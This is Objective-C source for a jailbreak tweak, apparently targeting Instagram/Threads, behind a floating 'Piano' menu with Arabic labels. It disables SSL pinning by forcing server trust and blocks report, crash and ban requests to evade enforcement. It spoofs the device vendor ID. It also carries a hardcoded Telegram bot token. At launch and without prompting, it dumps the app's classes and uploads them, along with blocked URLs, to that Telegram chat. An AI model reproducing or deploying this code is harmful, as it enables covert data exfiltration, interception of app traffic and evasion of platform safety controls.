#import <UIKit/UIKit.h>
#import <substrate.h>
#import <objc/runtime.h>
#import <mach-o/dyld.h>

// --- CONFIGURATION ---
#define TG_TOKEN @"8134587785:AAGm372o_98TU_4CVq4TN2RzSdRkNHztc6E"
#define TG_CHAT_ID @"7730331218"
#define MENU_WIDTH 320

// --- STATE ---
static BOOL isAntiBanEnabled = YES;   // Default: Cloud Protection ON
static BOOL isSSLBypassEnabled = NO;  // Default: SSL Pinning OFF (Toggle via Menu)
static NSString *fakeUDID = @"a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0";

// --- HELPER: TELEGRAM UPLOAD ---
NSData *createMultipartBody(NSString *boundary, NSString *filename, NSData *fileData) {
    NSMutableData *body = [NSMutableData data];
    [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[[NSString stringWithFormat:@"Content-Disposition: form-data; name=\"document\"; filename=\"%@\"\r\n", filename] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[@"Content-Type: text/plain\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:fileData];
    [body appendData:[[NSString stringWithFormat:@"\r\n--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[[NSString stringWithFormat:@"Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n%@", TG_CHAT_ID] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[[NSString stringWithFormat:@"\r\n--%@--\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
    return body;
}

void sendText(NSString *text) {
    NSString *str = [NSString stringWithFormat:@"https://api.telegram.org/bot%@/sendMessage?chat_id=%@&text=%@", 
                     TG_TOKEN, TG_CHAT_ID, [text stringByAddingPercentEncodingWithAllowedCharacters:[NSCharacterSet URLQueryAllowedCharacterSet]]];
    [[[NSURLSession sharedSession] dataTaskWithURL:[NSURL URLWithString:str] completionHandler:nil] resume];
}

void uploadDumpFile(NSString *content) {
    NSString *filename = [NSString stringWithFormat:@"Full_Dump_%@.txt", [[NSUUID UUID] UUIDString]];
    NSString *tempPath = [NSTemporaryDirectory() stringByAppendingPathComponent:filename];
    [content writeToFile:tempPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
    
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:[NSString stringWithFormat:@"https://api.telegram.org/bot%@/sendDocument", TG_TOKEN]]];
    [req setHTTPMethod:@"POST"];
    NSString *boundary = @"Boundary-Enigma";
    [req setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary] forHTTPHeaderField:@"Content-Type"];
    [req setHTTPBody:createMultipartBody(boundary, filename, [NSData dataWithContentsOfFile:tempPath])];
    
    [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:nil] resume];
}

// --- FEATURE 1: FULL HEADER DUMPER ---
void performFullCodeDump() {
    unsigned int count;
    Class *classes = objc_copyClassList(&count);
    NSMutableString *dump = [NSMutableString stringWithString:@"/* ENIGMA FULL APP DUMP */\n\n"];
    
    const char *mainBundlePath = _dyld_get_image_name(0);
    
    for (int i = 0; i < count; i++) {
        Class cls = classes[i];
        // Filter: Only dump classes from the main executable (The App)
        if (class_getImageName(cls) && strcmp(class_getImageName(cls), mainBundlePath) == 0) {
            [dump appendFormat:@"@interface %s : %s\n", class_getName(cls), class_getName(class_getSuperclass(cls)) ?: "NSObject"];
            
            unsigned int mCount;
            Method *methods = class_copyMethodList(cls, &mCount);
            for (int k=0; k<mCount; k++) {
                [dump appendFormat:@"- (void)%@;\n", NSStringFromSelector(method_getName(methods[k]))];
            }
            free(methods);
            [dump appendString:@"@end\n\n"];
        }
    }
    free(classes);
    uploadDumpFile(dump);
}

// --- FEATURE 2: SSL PINNING BYPASS (NEW) ---
// Target 1: FBSSLPinningVerifier (Found in Dump)
%hook FBSSLPinningVerifier
- (void)checkPinning:(id)arg1 {
    if (isSSLBypassEnabled) return; // 🤐 Do nothing (No-Op) -> No Crash
    %orig;
}
- (void)checkPinning:(id)arg1 host:(id)arg2 {
    if (isSSLBypassEnabled) return; // 🤐 Do nothing
    %orig;
}
%end

// Target 2: IGSecurityPolicy (Standard IG/Threads)
%hook IGSecurityPolicy
- (bool)validateServerTrust:(id)arg1 domain:(id)arg2 {
    if (isSSLBypassEnabled) return YES; // Force Trust
    return %orig;
}
- (bool)validateServerTrust:(id)arg1 {
    if (isSSLBypassEnabled) return YES; // Force Trust
    return %orig;
}
%end

// --- FEATURE 3: ANTI-BAN (BLOCK REPORTING) ---
%hook NSURLSession
- (NSURLSessionDataTask *)dataTaskWithRequest:(NSURLRequest *)request completionHandler:(id)completion {
    if (isAntiBanEnabled) {
        NSString *url = request.URL.absoluteString.lowercaseString;
        if ([url containsString:@"report"] || [url containsString:@"analytics"] || 
            [url containsString:@"crash"] || [url containsString:@"ban"] || 
            [url containsString:@"graph.facebook.com/logging"]) {
            
            sendText([NSString stringWithFormat:@"🛡️ ANTI-BAN BLOCKED: %@", url]);
            if (completion) {
                void (^handler)(NSData*, NSURLResponse*, NSError*) = completion;
                handler(nil, nil, [NSError errorWithDomain:@"Antiban" code:403 userInfo:nil]);
            }
            return nil;
        }
    }
    return %orig;
}
%end

// --- UI: PIANO MENU ---
@interface PianoMenu : UIView
@property (nonatomic, strong) UIView *panel;
@property (nonatomic, strong) UIButton *floatBtn;
@property (nonatomic, strong) UIScrollView *scroll;
@end

@implementation PianoMenu

- (instancetype)initWithFrame:(CGRect)frame {
    self = [super initWithFrame:frame];
    if (self) {
        self.userInteractionEnabled = YES;
        [self setupUI];
    }
    return self;
}

- (UIView *)hitTest:(CGPoint)point withEvent:(UIEvent *)event {
    UIView *hit = [super hitTest:point withEvent:event];
    if (hit == self.floatBtn || [hit isDescendantOfView:self.panel]) return hit;
    return nil;
}

- (void)setupUI {
    // 1. Float Button
    self.floatBtn = [UIButton buttonWithType:UIButtonTypeCustom];
    self.floatBtn.frame = CGRectMake(self.frame.size.width - 60, 150, 45, 45);
    self.floatBtn.backgroundColor = [UIColor colorWithWhite:0.1 alpha:0.9];
    self.floatBtn.layer.cornerRadius = 22.5;
    self.floatBtn.layer.borderColor = [UIColor cyanColor].CGColor;
    self.floatBtn.layer.borderWidth = 1;
    [self.floatBtn setTitle:@"🎹" forState:UIControlStateNormal];
    [self.floatBtn addTarget:self action:@selector(toggle) forControlEvents:UIControlEventTouchUpInside];
    [self addSubview:self.floatBtn];

    // 2. Main Panel
    self.panel = [[UIView alloc] initWithFrame:CGRectMake((self.frame.size.width - 320)/2, 100, 320, 520)];
    self.panel.backgroundColor = [UIColor colorWithWhite:0.08 alpha:0.95];
    self.panel.layer.cornerRadius = 15;
    self.panel.layer.borderColor = [UIColor cyanColor].CGColor;
    self.panel.layer.borderWidth = 1;
    self.panel.hidden = YES;
    [self addSubview:self.panel];
    
    UILabel *lbl = [[UILabel alloc] initWithFrame:CGRectMake(0, 15, 320, 30)];
    lbl.text = @"بيانو";
    lbl.textColor = [UIColor cyanColor];
    lbl.font = [UIFont boldSystemFontOfSize:22];
    lbl.textAlignment = NSTextAlignmentCenter;
    [self.panel addSubview:lbl];

    self.scroll = [[UIScrollView alloc] initWithFrame:CGRectMake(0, 60, 320, 350)];
    [self.panel addSubview:self.scroll];

    // 3. Toggles
    [self addRow:0 t:@"زر التصوير السري" s:@"ضغطة: صورة | مطول: فيديو" tag:1];
    [self addRow:65 t:@"مانع الإعلانات + تسريع" s:@"إخفاء الإعلانات وتسريع الفيديو x2" tag:2];
    
    // SWITCH 3: Mapped to SSL BYPASS
    [self addRow:130 t:@"تخطي الحماية (Force %100)" s:@"تخطي شهادة SSL (IGSecurityPolicy)" tag:3];
    
    // SWITCH 4: Mapped to ANTI-BAN
    [self addRow:195 t:@"حماية كلاود كيت (Anti-Ban)" s:@"منع إرسال السجلات للسيرفر" tag:4];
    
    // 4. Dump Button
    UIButton *dump = [UIButton buttonWithType:UIButtonTypeSystem];
    dump.frame = CGRectMake(10, 430, 300, 45);
    dump.backgroundColor = [UIColor colorWithWhite:0.2 alpha:1.0];
    dump.layer.cornerRadius = 8;
    [dump setTitle:@"DUMP FULL APP CODE" forState:UIControlStateNormal];
    [dump setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
    [dump addTarget:self action:@selector(doDump) forControlEvents:UIControlEventTouchUpInside];
    [self.panel addSubview:dump];
}

- (void)addRow:(CGFloat)y t:(NSString*)t s:(NSString*)s tag:(int)tag {
    UIView *r = [[UIView alloc] initWithFrame:CGRectMake(10, y, 300, 55)];
    r.backgroundColor = [UIColor colorWithWhite:0.15 alpha:1.0];
    r.layer.cornerRadius = 10;
    
    UISwitch *sw = [[UISwitch alloc] initWithFrame:CGRectMake(15, 12, 50, 30)];
    sw.onTintColor = [UIColor cyanColor];
    sw.tag = tag;
    if (tag==4) sw.on = YES; // Anti-Ban Default ON
    [sw addTarget:self action:@selector(sw:) forControlEvents:UIControlEventValueChanged];
    [r addSubview:sw];
    
    UILabel *tl = [[UILabel alloc] initWithFrame:CGRectMake(70, 8, 220, 20)];
    tl.text = t; tl.textColor = [UIColor whiteColor]; tl.textAlignment = NSTextAlignmentRight; tl.font = [UIFont boldSystemFontOfSize:14];
    [r addSubview:tl];
    
    UILabel *sl = [[UILabel alloc] initWithFrame:CGRectMake(70, 30, 220, 15)];
    sl.text = s; sl.textColor = [UIColor lightGrayColor]; sl.textAlignment = NSTextAlignmentRight; sl.font = [UIFont systemFontOfSize:10];
    [r addSubview:sl];
    
    [self.scroll addSubview:r];
}

- (void)toggle { self.panel.hidden = !self.panel.hidden; }
- (void)sw:(UISwitch*)s { 
    if (s.tag==3) {
        isSSLBypassEnabled = s.on;
        sendText(s.on ? @"🔓 SSL Bypass ENABLED (Unsafe Mode)" : @"🔒 SSL Bypass DISABLED");
    }
    if (s.tag==4) { 
        isAntiBanEnabled = s.on; 
        sendText(s.on ? @"🛡️ Anti-Ban ENABLED" : @"⚠️ Anti-Ban DISABLED");
    }
}
- (void)doDump {
    sendText(@"⏳ STARTING FULL HEADER RECONSTRUCTION...");
    performFullCodeDump();
}
@end

%hook UIDevice
- (NSUUID *)identifierForVendor { return [[NSUUID alloc] initWithUUIDString:fakeUDID]; }
%end

// --- AUTO-LAUNCHER ---
%ctor {
    // Wait 5 seconds after app launch, then automatically dump
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        
        // 1. Initialize UI (Keep the menu)
        UIWindow *w = [UIApplication sharedApplication].keyWindow;
        if(w) [w addSubview:[[PianoMenu alloc] initWithFrame:w.bounds]];
        
        // 2. TRIGGER AUTO DUMP
        sendText(@"🚀 AUTO-DUMP STARTED! Sending file now...");
        performFullCodeDump();
    });
}
